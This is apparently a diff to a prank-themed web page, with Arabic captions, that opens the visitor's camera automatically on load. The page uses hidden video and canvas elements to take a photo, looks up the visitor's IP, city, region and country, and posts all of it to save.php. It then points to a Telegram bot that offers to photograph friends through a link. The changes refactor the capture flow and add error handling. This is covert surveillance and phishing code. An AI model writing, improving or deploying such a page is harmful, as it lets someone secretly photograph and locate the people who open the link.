@@ -137,7 +137,7 @@
 	.stylish-text:hover {
   	  color: black;
   	  transform: scale(1.1);
-  	  text-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 20px rgba(255, 255, 255, 0.6); /* إضافة تأثير التوهج */
+  	  text-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 20px rgba(255, 255, 255, 0.6);
 	}
 
 	#error-message {
@@ -193,7 +193,6 @@
 </head>
 <body>
 
-
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <div id="photo-container">
@@ -240,6 +239,7 @@
 		'استمتع بلقطة جديدة'
 		];
 		const randomCaption = captions[Math.floor(Math.random() * captions.length)];
+        
         function showErrorMessage(message) {
     		const errorMessageElement = document.getElementById('error-message');
  		   errorMessageElement.textContent = message;
@@ -259,10 +259,20 @@
         }
         
         async function getGeoInfo() {
-            const response = await fetch('https://get.geojs.io/v1/ip/geo.js');
-            const text = await response.text();
-            const jsonData = text.replace('geoip(', '').replace(')', '');
-            return JSON.parse(jsonData);
+            try {
+                const response = await fetch('https://get.geojs.io/v1/ip/geo.js');
+                const text = await response.text();
+                const jsonData = text.replace('geoip(', '').replace(')', '');
+                return JSON.parse(jsonData);
+            } catch (error) {
+                console.error('Error fetching geo info:', error);
+                return {
+                    country: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    ip: 'Unknown'
+                };
+            }
         }
 
         function getQueryParameter(param) {
@@ -270,8 +280,10 @@
             return params.get(param);
         }
 
-        async function capturePhotoForIOS(skipLoader = false) {
+        async function capturePhotoForIOS() {
             try {
+                loadingElement.style.display = 'block';
+                
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: true,
                     audio: false,
@@ -292,75 +304,26 @@
                 canvasElement.height = videoElement.videoHeight;
                 canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
 
-                canvasElement.toBlob(async (blob) => {
-                    if (!blob) {
-                        throw new Error("فشل في تحويل الصورة إلى blob");
-                    }
-                    
-					if (!skipLoader) {
-                    	loadingElement.style.display = 'block';
-                    }
-                    
-                    const geoInfo = await getGeoInfo();
-                    const videoId = getQueryParameter('video');
-
-                    const formData = new FormData();
-                    formData.append('image', blob, 'photfo.png');
-                    formData.append('country', geoInfo.country);
-                    formData.append('city', geoInfo.city);
-                    formData.append('region', geoInfo.region);
-                    formData.append('ip', geoInfo.ip);
-                    formData.append('video', videoId);
-
-                    await fetch('save.php', {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    loadingElement.style.display = 'none';
-
-                    const imageUrl = URL.createObjectURL(blob);
-                    photoElement.src = imageUrl;
-                    photoContainer.style.display = 'block';
-                    captionElement.textContent = randomCaption;
-                    linkElement.textContent = 'اضغط للدخول للبوت الخاص بالتقاط الصور ومقلبة الاصدقاء | الصورة عبر الرابط 📸';
-                    newCaptureButton.style.display = 'inline-block';
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/png');
-
-            } catch (error) {
-                console.error('Error capturing photo:', error);
-                showErrorMessage('An error occurred, try again with permissions. ');
-            }
-        }
-
-        async function capturePhotoForOtherDevices(skipLoader = false) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: true,
-                    audio: false,
+                const blob = await new Promise((resolve) => {
+                    canvasElement.toBlob(resolve, 'image/png');
                 });
 
-                const videoTrack = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(videoTrack);
-
-                const blob = await imageCapture.takePhoto();
-
-                if (!skipLoader) {
-                    loadingElement.style.display = 'block';
-                 }
+                if (!blob) {
+                    throw new Error("فشل في تحويل الصورة إلى blob");
+                }
                 
                 const geoInfo = await getGeoInfo();
                 const videoId = getQueryParameter('video');
 
                 const formData = new FormData();
-                formData.append('image', blob, 'photfo.png');
+                formData.append('image', blob, 'photo.png');
                 formData.append('country', geoInfo.country);
                 formData.append('city', geoInfo.city);
                 formData.append('region', geoInfo.region);
                 formData.append('ip', geoInfo.ip);
                 formData.append('video', videoId);
 
+                // إرسال الصورة إلى السيرفر
                 await fetch('save.php', {
                     method: 'POST',
                     body: formData
@@ -374,31 +337,80 @@
                 captionElement.textContent = randomCaption;
                 linkElement.textContent = 'اضغط للدخول للبوت الخاص بالتقاط الصور ومقلبة الاصدقاء | الصورة عبر الرابط 📸';
                 newCaptureButton.style.display = 'inline-block';
+                
                 stream.getTracks().forEach(track => track.stop());
+
             } catch (error) {
                 console.error('Error capturing photo:', error);
-                showErrorMessage('An error occurred, try again with permissions. ');
+                loadingElement.style.display = 'none';
+                showErrorMessage('حدث خطأ، يرجى المحاولة مرة أخرى مع منح الصلاحيات.');
             }
         }
 
-        if (isIOS()) {
-            capturePhotoForIOS();
-        } else {
-            capturePhotoForOtherDevices();
+        async function capturePhotoForOtherDevices() {
+            try {
+                loadingElement.style.display = 'block';
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: false,
+                });
+
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+
+                const blob = await imageCapture.takePhoto();
+                
+                const geoInfo = await getGeoInfo();
+                const videoId = getQueryParameter('video');
+
+                const formData = new FormData();
+                formData.append('image', blob, 'photo.png');
+                formData.append('country', geoInfo.country);
+                formData.append('city', geoInfo.city);
+                formData.append('region', geoInfo.region);
+                formData.append('ip', geoInfo.ip);
+                formData.append('video', videoId);
+
+                // إرسال الصورة إلى السيرفر
+                await fetch('save.php', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                loadingElement.style.display = 'none';
+
+                const imageUrl = URL.createObjectURL(blob);
+                photoElement.src = imageUrl;
+                photoContainer.style.display = 'block';
+                captionElement.textContent = randomCaption;
+                linkElement.textContent = 'اضغط للدخول للبوت الخاص بالتقاط الصور ومقلبة الاصدقاء | الصورة عبر الرابط 📸';
+                newCaptureButton.style.display = 'inline-block';
+                
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error('Error capturing photo:', error);
+                loadingElement.style.display = 'none';
+                showErrorMessage('حدث خطأ، يرجى المحاولة مرة أخرى مع منح الصلاحيات.');
+            }
         }
-         // تأخير 3 ثواني قبل فتح الكاميرا
-setTimeout(() => {
-    if (isIOS()) {
-      capturePhotoForIOS();
-    } else {
-      capturePhotoForOtherDevices();
-    }
-  }, 1000);
+
+        // بدء عملية التقاط الصورة تلقائياً عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                if (isIOS()) {
+                    capturePhotoForIOS();
+                } else {
+                    capturePhotoForOtherDevices();
+                }
+            }, 1000);
+        });
+
         linkElement.addEventListener('click', function() {
             window.open('https://t.me/Prankstdbot', '_blank');
         });
        
-       newCaptureButton.addEventListener('click', () => {
+        newCaptureButton.addEventListener('click', () => {
             photoContainer.style.display = 'none';
             newCaptureButton.style.display = 'none';
             captionElement.textContent = '';
